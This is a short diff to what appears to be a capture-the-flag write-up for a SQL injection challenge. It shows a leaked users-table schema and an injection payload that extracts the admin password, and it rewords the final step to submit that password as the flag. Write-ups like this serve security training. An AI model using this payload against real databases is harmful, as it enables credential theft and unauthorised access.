@@ -30,9 +30,9 @@
 
    Output:
 
-   ```
+   `
    "hhhCREATE TABLE "xde43_users" ( "id" int(10) NOT NULL, "name" varchar(255) NOT NULL, "email" varchar(255) NOT NULL, "password" varchar(255) NOT NULL, "role" varchar(100) DEFAULT NULL )"
-   ```
+   `
 
 5. To retrieve the admin password:
 
@@ -40,4 +40,4 @@
    hhh' || (SELECT password FROM xde43_users WHERE role='admin'))--
    ```
 
-6. Use the retrieved password to log in as admin and solve the challenge.
+6. Submit the password as flag and solve the challenge.
